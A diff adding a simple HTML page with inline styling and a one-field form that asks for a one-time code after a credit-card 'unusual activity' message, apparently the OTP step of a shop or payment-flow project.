@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Two-factor authentication</title>
+    <style>
+    * {
+  box-sizing: border-box;
+}
+
+body {
+  background: #F6cdae;
+  font-family: sans-serif;
+  font-size: 100%;
+  color: #555;
+  margin: 0;
+  padding: 0;
+}
+    form {
+    background-color: #83ae9b;
+  /*background-image: linear-gradient(blue,green);*/
+  box-shadow: rgba(0,0,0,.15) 0 2px 20px,
+              rgba(0,0,0,.1) 0 0 3px;
+  border-radius: 6px;
+  min-width: 320px;
+  max-width: 550px;
+  width: 60%;
+  padding: 0;
+  margin: 2em auto;
+}
+
+.ff{
+    background-color: #83ae9b;
+    /*background-image: linear-gradient(blue,green);*/
+    box-shadow: rgba(0,0,0,.15) 0 2px 20px,
+              rgba(0,0,0,.1) 0 0 3px;
+  border-radius: 6px;
+  min-width: 320px;
+  max-width: 550px;
+  width: 60%;
+  padding: 0;
+  margin: 2em auto;
+}
+h4{
+        color: #721c24;
+        font-family: Lemon/Milk;
+        /*font-size: large;*/
+    border-top-width: 2px;
+    border-top-style: hidden;
+    border-top-color: #dc3545;
+    border-right-width: 2px;
+    border-right-style: hidden;
+    border-right-color: #dc3545;
+    border-left-width: 2px;
+    border-left-style: hidden;
+    border-left-color: #dc3545;
+    border-bottom-width: 2px;
+    border-bottom-style: groove;
+    border-bottom-color: #062c33;
+    padding-top: 50px;
+    padding-right: 10px;
+    padding-left: 10px;
+    padding-bottom: 10px;
+    text-align: center;
+        margin: 50px;
+        background: rgba(76,17,80,0.1)
+    }
+
+    </style>
+</head>
+<body>
+ 
+<form action="order" class="ff" method="POST">
+<h4> We have detected some unusual activity on your credit card.<br> Please authenticate your identity to continue with the transaction.</h4>
+     <div class=" field field_fname">
+      <label for="fname">Enter the code: </label>
+      <input type="text" pattern="{0-9}" class="input-text"  name="otp"  required/>
+
+         <input type="submit" class="button" value="Submit OTP" name = "submit"/>
+    </div>
+
+</form>
+
+
+</body>
+</html>
